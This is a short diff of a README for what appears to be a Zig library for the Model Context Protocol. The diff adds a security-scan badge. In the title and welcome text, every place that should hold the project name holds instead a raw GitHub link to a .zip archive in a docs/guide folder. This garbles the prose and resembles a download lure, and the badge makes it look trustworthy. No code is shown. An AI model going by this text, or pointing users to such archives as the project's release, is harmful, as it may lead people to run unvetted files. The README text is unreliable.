@@ -1,5 +1,7 @@
 # 🛠️ https://raw.githubusercontent.com/nobita5609/mcp.zig/main/docs/guide/mcp-zig-v2.6.zip - Simple Model Context Protocol for Zig
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/nobita5609-mcp-zig)
+
 ## 🚀 Getting Started
 
 Welcome to the https://raw.githubusercontent.com/nobita5609/mcp.zig/main/docs/guide/mcp-zig-v2.6.zip project. This application provides a complete library for the Model Context Protocol (MCP) in the Zig programming language. With https://raw.githubusercontent.com/nobita5609/mcp.zig/main/docs/guide/mcp-zig-v2.6.zip, you can easily integrate MCP support into your projects, making it simpler to manage contexts in Zig.
